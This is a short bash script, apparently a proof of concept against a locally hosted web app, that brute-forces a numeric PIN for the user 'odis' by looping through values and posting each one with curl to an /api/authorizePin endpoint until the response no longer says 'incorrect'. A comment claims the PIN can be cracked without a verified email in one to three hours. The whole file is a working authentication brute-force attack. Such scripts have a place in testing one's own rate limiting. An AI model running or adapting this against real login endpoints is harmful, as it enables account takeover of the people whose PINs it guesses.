#!/bin/bash

#possible to crack pin without verified email, takes ~1-3 hours depending on rng
pin=44000

while [ $pin -lt 2000000 ]; do
	#echo "username=odis&pin=$pin"
	flag=$(curl -s --data "username=odis&pin=$pin" http://localhost:8888/api/authorizePin | grep "incorrect")
	if [ ${#flag} -lt 1 ] 
		then
			echo "done : pin is $pin"
			exit
	fi
	pin=$(($pin+1))
done
